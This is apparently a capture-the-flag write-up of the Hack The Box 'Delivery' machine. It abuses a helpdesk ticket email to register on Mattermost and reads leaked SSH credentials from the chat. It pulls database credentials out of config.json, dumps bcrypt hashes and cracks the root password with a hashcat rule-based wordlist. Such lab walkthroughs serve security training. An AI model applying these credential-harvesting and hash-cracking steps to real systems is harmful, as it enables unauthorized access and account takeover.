![Image 16](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/16.png)


## ------------>> Delivery <<--------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.222 -p-
-------

    Nmap scan report for delivery.htb (10.10.10.222)
    Host is up (0.43s latency).
    Not shown: 65532 closed ports
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
    |   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
    |_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
    80/tcp   open  http    nginx 1.14.2
    |_http-server-header: nginx/1.14.2
    |_http-title: Welcome
    8065/tcp open  unknown
    | fingerprint-strings: 
    |   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest: 
    |     HTTP/1.0 200 OK
    |     Accept-Ranges: bytes
    |     Cache-Control: no-cache, max-age=31556926, public
    |     Content-Length: 3108
    |     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
    |     Content-Type: text/html; charset=utf-8
    |     Last-Modified: Sat, 28 Aug 2021 21:32:28 GMT
    |     X-Frame-Options: SAMEORIGIN
    |     X-Request-Id: 13qjetgyifd1mkdnx7b8ise6qo
    |     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
    |     Date: Sat, 28 Aug 2021 22:09:30 GMT
    |     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
    |   HTTPOptions: 
    |     HTTP/1.0 405 Method Not Allowed
    |     Date: Sat, 28 Aug 2021 22:09:31 GMT
    |_    Content-Length: 0


// Navigating to http://10.10.10.222/ we can see some email realated service support website

// On the buttom of the site we can see a 'Contact us' button, lets click him

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/1.png)

// Now we can see the 'Contact us' page and there is to words that redirect us to other pages and sites

    'HelpDesk'              ->  helpdesk.delivery.htb
    'MatterMost server'     ->  delivery.htb:8065

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/2.png)

// Lets add the domain and the subdomain to /etc/hosts

    $ cat /etc/hosts

    # Host addresses
    10.10.10.222 delivery.htb helpdesk.delivery.htb
    
// Lets now navigate to http://helpdesk.delivery.htb

// On this site we already loged in as a Guest user and we can open a new ticket

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/4.png)

// When openning a ticket we need to fill a form(can with fake) and click 'Create Ticket'

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/5.png)

// After creating the ticket we redirect to 'open.php' page that gives us a mail to check the ticket information.

![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/6.png)

// Also there is 'View Ticket Thread' option that gives us a info about the ticket

![Image 7](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/7.png)

// Navigate us to:

![Image 8](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/8.png)

// Unfortinatly, nothing else from there...

// Lets navigate to http://delivery.htb:8065/ , there we represent with a login page to 'MatterMost' service

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/3.png)

// When we click on 'Create New Account' we can see we need a email

// I tried some emails but it asks for a verification from the mail box

// so i decided to add the mail we got when creating the ticket

![Image 9](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/9.png)

// And again, we need to verify

![Image 10](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/10.png)

// Only now we we gave the email that supose to help us update the ticket, lets check the ticket back in helpdesk

![Image 11](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/11.png)

// And we got the verification mail !

// Navigate to the verification url

![Image 12](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/12.png)

// We can log-in now

![Image 13](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/13.png)

// Click on internal redirect us to the dashboard

![Image 14](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/14.png)

    maildeliverer : Youve_G0t_Mail!

// And we got credentials , since ssh service open lets try to connect with this credentials

    $ ssh maildeliverer@10.10.10.222
    maildeliverer@10.10.10.222's password: 

    maildeliverer@Delivery:~$ id
    uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer)

// And user flag !

    maildeliverer@Delivery:~$ cat user.txt 
    1e5bea023................

### -------Privilleges Escalation--------

// Searching the target machine for intersting files

// I see the mattermost config directory inside /opt

// There i found file called 'config.json' with database credentials

    maildeliverer@Delivery:/opt/mattermost/config$ cat config.json 
    ...
        },
        "SqlSettings": {
            "DriverName": "mysql",
            "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
            "DataSourceReplicas": [],
            "DataSourceSearchReplicas": [],
            "MaxIdleConns": 20,
            "ConnMaxLifetimeMilliseconds": 3600000,
            "MaxOpenConns": 300,
            "Trace": false,
            "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
            "QueryTimeout": 30,
            "DisableDatabaseSearch": false
    ...

// Lets try to connect the database with this credentials

    $ mysql -u mmuser -pCrack_The_MM_Admin_PW mattermost
-----
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A

    Welcome to the MariaDB monitor.  Commands end with ; or \g.
    Your MariaDB connection id is 157
    Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

    Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

    MariaDB [mattermost]>

// It worked !, now lets search for information

    MariaDB [mattermost]> SHOW DATABASES;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | mattermost         |
    +--------------------+
    2 rows in set (0.000 sec)
------

    MariaDB [mattermost]> SHOW TABLES;
    +------------------------+
    | Tables_in_mattermost   |
    +------------------------+
    | Audits                 |
    | Bots                   |
    ...
    | Tokens                 |
    | UploadSessions         |
    | UserAccessTokens       |
    | UserGroups             |
    | UserTermsOfService     |
    | Users                  |
    +------------------------+

// Extract users and passwords from 'Users' table

    MariaDB [mattermost]> SELECT username,password FROM Users;
    +----------------------------------+--------------------------------------------------------------+
    | username                         | password                                                     |
    +----------------------------------+--------------------------------------------------------------+
    | anony                            | $2a$10$uhylrqN33ZHEoCOYkvREZ.AqDf/pTX6kTv4Hib1W3u5prLKtdIImC |
    | surveybot                        |                                                              |
    | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
    | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
    | someuser                         | $2a$10$jvWaaLYiRBdbc68iW66RfuEaEST1YPcLU/o0EIXVo6uvMh40OAIlC |
    | anonymous                        | $2a$10$53zUIVa4WBHwTPhinTdRtuZTTL6pcy4l5Ew051VfoAAuD/JAjU/Ku |
    | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
    | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
    | channelexport                    |                                                              |
    | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
    | userrrr                          | $2a$10$23DGe9yDODCFG5rtOw.9UOsCCkQ8YqFtNAZwcioFN3M3dDP0phcxC |
    +----------------------------------+--------------------------------------------------------------+

// First lets undenify the hash, we can do that with online [hash-analyzer](https://www.tunnelsup.com/hash-analyzer/)

![Image 15](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Delivery/15.png)

// Next we need a wordlist, Based on the comments from Mattermost, lets make a little wordlist

    $ cat passwords_list 
    
    pass
    password1
    p4ssw0rd
    PleaseSubScribe
    PleaseSubscribe!

// Since have a hint that earlier mention of “hashcat” as a guide,

// we will create a password list using the best64.rule haschat .rule file that will based on our small wordlist.

    $ hashcat -r /usr/share/hashcat/rules/best64.rule --stdout passwords_list > passwords.txt

// And now we can BruteForce the hash using our new list

    $ hashcat -m 3200 root_hash.txt passwords.txt 
    ...
    $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
    ...                                        

// We have root password !!!

    maildeliverer@Delivery:~$ su -
    Password: 
    root@Delivery:~# id
    uid=0(root) gid=0(root) groups=0(root)

// And root flag !!!!

    root@Delivery:~# cat /root/root.txt 
    0a37d20cfd8ea1f611377419902ebdea
